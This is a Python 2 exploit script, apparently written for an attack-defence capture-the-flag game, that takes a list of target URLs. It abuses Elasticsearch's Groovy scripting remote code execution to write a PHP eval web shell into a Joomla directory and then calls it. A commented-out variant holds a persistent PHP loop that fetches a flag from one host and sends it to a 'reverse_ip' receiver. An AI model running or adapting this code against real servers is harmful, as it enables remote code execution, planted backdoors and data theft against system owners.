#!/usr/bin/env python
# -*- coding: utf_8 -*-

import os, sys, re
import requests
from optparse import OptionParser


class ElasticSearchExp:
    def __init__(self,url_file,timeout,reverse_ip,flag_ip_path):
        self.url_file = url_file
        self.timeout = timeout
        self.reverse_ip=reverse_ip
        self.flag_ip_path=flag_ip_path
        self.url_info = []
        #self.joomla_path="/var/www/joomla/defines.php" #joomla路径
        #self.lumanager_path="/usr/local/LuNamp/pm/config.php"#lumanager路径
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded"
        }
    #打开文件
    def __load_target(self):
        with open(self.url_file,'rb+') as f:
            for info in f.readlines():
                if not info.startswith('#') and info.strip():
                    self.url_info.append(info.strip())

    def __check_target_available(self,url):
        try:
            result = requests.head(url,headers= self.headers,timeout= self.timeout)
            if result.status_code == 200:
                return True
        except:
            print '%s cannot access!' % url

    def __exec(self,url,cmd,reverse_ip,flag_ip):

        dict={"joomla":"/var/www/joomla/iloveyou.php","lumanager":"/usr/local/LuManager/db_config.php"}
        dst="/var/www/joomla/connet.php"
        #ds1=["/var/www/joomla/connet.php","/usr/local/LuManager/db_connet.php","/var/www/joomla/config.php","/usr/local/LuManager/db_config.php"]
        file = "<?php eval(\\\\$_POST[1]);?>hello"
        ##内存马
        #file2 = "<?php unlink(\\\\$_SERVER[\'SCRIPT_FILENAME\']);ignore_user_abort(true);set_time_limit(0);while (true) {\\\\$x = file_get_contents(\'" + flag_ip + "\');file_get_contents(\'" + reverse_ip + "/recive.php?a=\'.\\\\$x);sleep(60);}?>"
        
        result = False
        
        print file
        elastic_url = url + '_search?pretty'

        exp='{"size":1,"script_fields": {"exp": {"script":"java.lang.Math.class.forName(\\"java.io.FileOutputStream\\").getConstructor(java.io.File.class).newInstance(java.lang.Math.class.forName(\\"java.io.File\\").getConstructor(java.lang.String.class).newInstance(\\"' + dst + '\\")).write(java.lang.Math.class.forName(\\"java.lang.String\\").getConstructor(java.lang.String.class).newInstance(\\"' + file + '\\").getBytes())","lang": "groovy"}}}'

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            content = requests.post(elastic_url, data=exp, headers=headers, timeout= self.timeout).text
        except Exception:
            print '[!] error!'
            raise SystemExit
        if "success" in content:
            print "shell上传成功"
            result=True


        return result

    def exp(self):
        self.__load_target()#打开文件
        for item in self.url_info:
            _ = item.split('|||')#对文件惊醒处理

            url = _[0] if _[0].endswith('/') else _[0] + '/'
            print url
            cmd = _[1]

            if self.__check_target_available(url):
                result = self.__exec(url,cmd,self.reverse_ip,self.flag_ip_path)#上传shell
                if result:
                    try:
                        print cmd+"/config.php"
                        requests.get(cmd+"/iloveyou.php",timeout=5)
                    #http:// 192.168.49.143:8888/db_config.php
                    except Exception:
                        print '[!] error!'
                        pass

                print '*'*50
                print url
                print result


if __name__ == '__main__':
    #usage = 'usage: backdoor_exp [options] arg'
    #parser = OptionParser(usage)
    #parser.add_option('-f', '--url_file', dest = 'url_file', default = 'url.txt', help = 'the target file to pentest,defalut backdoor.txt')
    #parser.add_option('--timeout', dest = 'timeout', default = 5, help = 'http timeout,default 5')

    #(options, args) = parser.parse_args()

    #file = options.url_file
    #timeout = options.timeout
    file="url.txt"
    timeout=5
    reverse_ip="http://10.10.70.6"
    flag_ip_path="http://10.10.10.3:8888/getFlag"
    t = ElasticSearchExp(file,timeout,reverse_ip,flag_ip_path)
    t.exp()


